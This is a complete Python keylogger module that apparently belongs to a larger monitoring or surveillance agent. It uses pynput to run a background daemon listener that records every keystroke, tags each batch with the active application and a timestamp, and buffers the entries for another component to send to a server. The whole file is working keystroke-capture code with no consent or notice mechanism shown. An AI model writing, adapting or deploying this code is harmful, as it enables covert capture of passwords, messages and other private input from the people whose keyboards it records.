"""
Keylogger module - records keystrokes per application and sends to server.
Uses pynput (already in requirements). Buffers keys by active app and flushes periodically.
"""

import threading
from datetime import datetime, timezone
from logger import log

try:
    from pynput import keyboard as _kbd
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False
    log.warning("pynput not available - keylogger disabled")

_lock = threading.Lock()
_buffer: list[dict] = []   # flushed entries ready to send
_current_app: str = ""
_current_keys: list[str] = []
_listener = None

# Map special keys to readable representations
_SPECIAL_KEYS: dict = {}
if PYNPUT_AVAILABLE:
    _SPECIAL_KEYS = {
        _kbd.Key.enter: "[Enter]",
        _kbd.Key.tab: "[Tab]",
        _kbd.Key.backspace: "[BS]",
        _kbd.Key.delete: "[Del]",
        _kbd.Key.space: " ",
        _kbd.Key.esc: "[Esc]",
        _kbd.Key.up: "[Up]",
        _kbd.Key.down: "[Dn]",
        _kbd.Key.left: "[Lt]",
        _kbd.Key.right: "[Rt]",
        _kbd.Key.home: "[Home]",
        _kbd.Key.end: "[End]",
        _kbd.Key.page_up: "[PgUp]",
        _kbd.Key.page_down: "[PgDn]",
        # Modifier keys — produce empty string (no output)
        _kbd.Key.ctrl_l: "", _kbd.Key.ctrl_r: "",
        _kbd.Key.shift: "", _kbd.Key.shift_r: "",
        _kbd.Key.alt_l: "", _kbd.Key.alt_r: "",
        _kbd.Key.caps_lock: "",
        _kbd.Key.f1: "", _kbd.Key.f2: "", _kbd.Key.f3: "", _kbd.Key.f4: "",
        _kbd.Key.f5: "", _kbd.Key.f6: "", _kbd.Key.f7: "", _kbd.Key.f8: "",
        _kbd.Key.f9: "", _kbd.Key.f10: "", _kbd.Key.f11: "", _kbd.Key.f12: "",
    }


def _now_iso() -> str:
    return datetime.now(tz=timezone.utc).isoformat()


def _flush_current(force: bool = False) -> None:
    """Move current key buffer into the send buffer. Call with _lock held or force=True."""
    global _current_keys
    if not _current_keys:
        return
    keys_str = "".join(_current_keys)
    if keys_str.strip():
        _buffer.append({
            "appName": _current_app or "Unknown",
            "keys": keys_str[:2000],
            "timestamp": _now_iso(),
        })
    _current_keys = []


def set_current_app(app_name: str) -> None:
    """Called from main loop each heartbeat to update active app context."""
    global _current_app
    with _lock:
        if app_name != _current_app:
            _flush_current()
            _current_app = app_name


def _on_press(key) -> None:
    try:
        if key in _SPECIAL_KEYS:
            char = _SPECIAL_KEYS[key]
        elif hasattr(key, "char") and key.char:
            char = key.char
        else:
            return
        if char:
            with _lock:
                _current_keys.append(char)
    except Exception:
        pass


def get_and_clear() -> list[dict]:
    """Flush current buffer and return all collected entries, clearing the buffer."""
    with _lock:
        _flush_current()
        entries = list(_buffer)
        _buffer.clear()
    return entries


def start_keylogger() -> None:
    global _listener
    if not PYNPUT_AVAILABLE:
        log.warning("Keylogger: pynput unavailable, skipping")
        return
    if _listener is not None:
        return  # Already running
    try:
        _listener = _kbd.Listener(on_press=_on_press, suppress=False)
        _listener.daemon = True
        _listener.start()
        log.info("Keylogger started")
    except Exception as e:
        log.error("Failed to start keylogger: %s", e)


def stop_keylogger() -> None:
    global _listener
    if _listener:
        try:
            _listener.stop()
        except Exception:
            pass
        _listener = None
    log.info("Keylogger stopped")
